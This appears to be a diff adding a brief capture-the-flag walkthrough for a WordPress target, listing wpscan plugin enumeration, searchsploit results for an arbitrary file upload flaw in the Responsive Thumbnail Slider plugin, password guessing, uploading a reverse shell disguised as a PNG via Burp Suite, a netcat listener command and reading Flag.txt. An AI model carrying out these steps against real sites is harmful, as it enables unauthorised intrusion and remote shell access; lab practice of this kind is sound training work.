@@ -1,0 +1,26 @@
+website: media.breakthecode.com
+task: exploit and find Flag in Flag.txt
+
+procedure: 
+1. its a wp site, there is a login page
+2. scan for vulnerable plugins
+wpscan --url media.breakthecode.com --enumerate p 
+3. Responsive thumbnail slider is outdated
+┌──(kali㉿kali)-[~]
+└─$ searchsploit "responsive thumbnail slider"  
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                         |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin Responsive Thumbnail Slider - Arbitrary File Upload (Metasploit)                                                                                      | php/remote/45099.rb
+WordPress Plugin Responsive Thumbnail Slider 1.0 - Arbitrary File Upload                                                                                               | php/webapps/37998.txt
+
+4. scan for users and passwords.
+5. login
+7. thumbnail slider accepts the file as plugins
+8. upload reverse-shell as png and use burpsuite to remove png ext.
+9. nc -nlvp 4444 
+10. http://media.breakthecode.com/wp-content/uploads/wp-responsive-images-thumbail-slider 
+open the image you have uploaded 
+shell opens 
+locate Flag.txt
+cat Flag.txt
